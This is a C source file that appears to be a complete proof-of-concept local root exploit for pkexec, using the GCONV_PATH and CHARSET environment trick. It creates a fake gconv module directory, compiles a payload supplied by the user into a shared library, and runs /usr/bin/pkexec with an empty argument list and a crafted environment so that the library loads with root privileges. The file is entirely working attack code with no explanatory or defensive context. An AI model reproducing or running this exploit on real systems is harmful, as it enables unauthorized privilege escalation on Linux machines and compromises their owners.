#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

void read_payload(char *payload_file, char **payload_contents) {
  FILE *pfp = NULL;
  struct stat payload_stats = {0};
  size_t bytes_read = 0;

  if (NULL == payload_contents) {
    fprintf(stderr, "[-] Can't read to NULL ptr\n");
    goto EXIT;
  }

  if (0 > stat(payload_file, &payload_stats)) {
    fprintf(stderr, "[-] Failed to stat payload file\n");
    *payload_contents = NULL;
    goto EXIT;
  }

  if (NULL == (pfp = fopen(payload_file, "r"))) {
    fprintf(stderr, "[-] Failed to open payload file\n");
    *payload_contents = NULL;
    goto EXIT;
  }

  *payload_contents = calloc(payload_stats.st_size, sizeof(char));
  if (NULL == *payload_contents) {
    fprintf(stderr, "[-] Failed calloc for payload\n");
    *payload_contents = NULL;
    goto EXIT;
  }

  bytes_read =
      fread(*payload_contents, sizeof(char), payload_stats.st_size, pfp);
  if (bytes_read != payload_stats.st_size) {
    fprintf(stderr, "[-] Failed to read full payload: %ld of %ld\n", bytes_read,
            payload_stats.st_size);
    free(*payload_contents);
    *payload_contents = NULL;
  }

EXIT:
  if (NULL != pfp) {
    fclose(pfp);
  }
  return;
}

void setup(char *payload_file) {
  FILE *fp = NULL;
  char *pl_contents = NULL;

  read_payload(payload_file, &pl_contents);

  if (NULL == pl_contents) {
    fprintf(stderr, "[-] Unable to setup exploit\n");
    exit(-1);
  }

  // GCONV_PATH setup
  system("mkdir GCONV_PATH=.");
  system("touch GCONV_PATH=./privesc");
  system("chmod a+x GCONV_PATH=./privesc");

  // GConv Module Setup
  system("mkdir -p privesc");
  system("echo 'module UTF-8// PRIVESC// privesc 2' > privesc/gconv-modules");

  // Malicious Module
  fp = fopen("privesc/privesc.c", "w");
  fprintf(fp, "%s", pl_contents);
  fclose(fp);
  free(pl_contents);

  system("gcc -o privesc/privesc.so -shared -fPIC privesc/privesc.c ");
}

int main(int argc, char *argv[]) {
  int ret = 0;

  if (argc != 2 || argv[1] == NULL) {
    fprintf(stderr, "[-] Need Payload C File for Malicious SO\n");
    ret = -1;
    goto EXIT;
  }

  setup(argv[1]);

  char *args[] = {NULL};
  char *env[] = {"privesc", "PATH=GCONV_PATH=.", "CHARSET=PRIVESC", "SHELL=sh",
                 NULL};
  execve("/usr/bin/pkexec", args, env);

EXIT:
  return ret;
}